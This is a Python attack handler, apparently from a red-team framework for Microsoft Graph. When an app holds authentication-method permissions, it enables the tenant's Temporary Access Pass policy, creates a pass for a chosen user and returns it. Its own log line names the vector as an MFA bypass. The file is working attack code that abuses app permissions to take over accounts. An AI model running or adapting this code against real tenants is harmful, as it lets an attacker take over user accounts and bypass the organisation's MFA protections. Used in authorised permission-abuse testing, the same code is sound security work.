from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests

logger = logger.createLogger('attacks.handlers.policy_user_auth_method_handler')


class PolicyUserAuthMethod_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        if ("UserAuthenticationMethod.ReadWrite.All" in request.roles) and ("Policy.ReadWrite.AuthenticationMethod" in request.roles) :
            status = False
            attack_name = "policy_user_authVectors"
            message = ""
            error = "policy_user_authVectors - failed"
            conf = request.attack_config['UserPolicyAuth']
            logger.debug("Policy.ReadWrite.AuthenticationMethod- Allows the app to read and write all authentication method policies for the tenant, without a signed-in user.")
            logger.debug("UserAuthenticationMethod.ReadWrite.All- Allows the application to read and write authentication methods of all users in your organization, without a signed-in user.")
            logger.debug("Attack vector - bypass mfa.")
            try:
                create_message_URL = "https://graph.microsoft.com/v1.0/policies/authenticationMethodsPolicy/authenticationMethodConfigurations/temporaryAccessPass"
                message_obj = {

                "lifetimeInMinutes": 60,
                "isUsableOnce": "true",
                "state":"enabled"

                }
                result = requests.patch(create_message_URL, json=message_obj, headers=request.request_headers)

                if result.status_code == 204:
                    create_message_URL = "https://graph.microsoft.com/v1.0/users/" +conf["UserId"] + "/authentication/temporaryAccessPassMethods"
                    message_obj = {

                        "lifetimeInMinutes": 60,
                        "isUsableOnce": "true",
                        "state": "enabled"

                    }
                    result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
                    json = result.json()

                    message += "Temporary password is %s   \n" % (json["temporaryAccessPass"])
                    status = True
                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in policy_user_auth_method_handler function")

            
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))



        return super().handle(request,responses)
